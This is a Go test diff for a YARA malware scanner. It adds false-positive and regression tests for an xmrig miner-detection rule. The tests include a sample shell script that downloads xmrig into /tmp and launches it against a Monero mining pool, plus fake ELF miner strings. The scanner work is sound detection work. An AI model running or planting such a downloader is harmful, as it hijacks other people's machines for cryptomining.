@@ -348,3 +348,32 @@ func TestFPFlood_SpamHiddenLinks_NestedAnchorMarkup(t *testing.T) {
 		t.Error("spam_hidden_links regression: hidden nested-link block not detected")
 	}
 }
+
+func TestFPFlood_MinerXmrigBinaryRef_SvgBase64Blob(t *testing.T) {
+	s := loadRepoYaraScanner(t)
+	// A 45x45 marketing icon whose embedded base64 raster data happens to
+	// contain the substring "XMrIG" -- the real prod FP on the WebToffee
+	// wt-woocommerce-related-products admin/img best-sellers-plugin.svg. The
+	// bare miner name is not enough; a genuine miner binary carries mining
+	// context (stratum/algo/donate-level) which a marketing SVG never does.
+	legit := []byte(`<svg width="45" height="45" viewBox="0 0 45 45" fill="none" xmlns="http://www.w3.org/2000/svg">` +
+		`<image href="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAF1foSTmiKVo/zuo3eO93KENzuRkGnLLMCFjfmN50XMrIGPdgLsIIf1ZhbAHZ7/Crggz6sC/YXVVpBSciSEs98"/></svg>`)
+	if hasYaraRule(s.ScanBytes(legit), "miner_xmrig_binary_ref") {
+		t.Error("miner_xmrig_binary_ref FP: matched XMrIG substring inside SVG base64 image data")
+	}
+	mal := []byte(`#!/bin/sh
+cd /tmp && curl -s https://xmrig.com/download/xmrig-linux.tar.gz -o x.tgz && tar xf x.tgz
+./xmrig -o stratum+tcp://pool.minexmr.com:4444 -u 48WalletAddr --coin monero --donate-level 1 --cpu-priority 5`)
+	if !hasYaraRule(s.ScanBytes(mal), "miner_xmrig_binary_ref") {
+		t.Error("miner_xmrig_binary_ref regression: real xmrig downloader/launcher not detected")
+	}
+}
+
+func TestFPFlood_MinerXmrigBinaryRef_ElfBinaryStrings(t *testing.T) {
+	s := loadRepoYaraScanner(t)
+	// The xmrig ELF itself carries its name alongside algo/protocol strings.
+	binary := []byte("\x7fELF\x02\x01\x01xmrig 6.21.0\x00randomx\x00cryptonight\x00stratum+tcp\x00donate-level\x00")
+	if !hasYaraRule(s.ScanBytes(binary), "miner_xmrig_binary_ref") {
+		t.Error("miner_xmrig_binary_ref regression: xmrig ELF strings not detected")
+	}
+}
